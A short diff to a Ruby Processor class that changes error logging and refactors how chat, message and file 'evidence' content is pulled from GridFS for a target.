@@ -77,7 +77,8 @@ class Processor
 
   rescue Exception => e
     trace :error, "Cannot process evidence: #{e.message}"
-    #trace :error, e.backtrace.join("\n")
+    trace :error, e.backtrace.join("\n")
+    sleep 1
     #FileUtils.rm_rf temp
     #FileUtils.mv temp, temp + '.jpg'
     #exit!
@@ -91,10 +92,13 @@ class Processor
         content = evidence[:data]['content']
       when 'chat'
         content = evidence[:data]['content']
-      when 'mail'
-        #content = evidence[:data]['body']
-        file = RCS::DB::GridFS.get evidence[:data]['_grid'], target
-        content = file.read
+      when 'message'
+        if evidence[:data][:type] == 'mail'
+          file = RCS::DB::GridFS.get evidence[:data]['_grid'], target
+          content = file.read
+        else
+          content = evidence[:data]['content']
+        end
       when 'file'
         file = RCS::DB::GridFS.get evidence[:data]['_grid'], target
         content = file.read
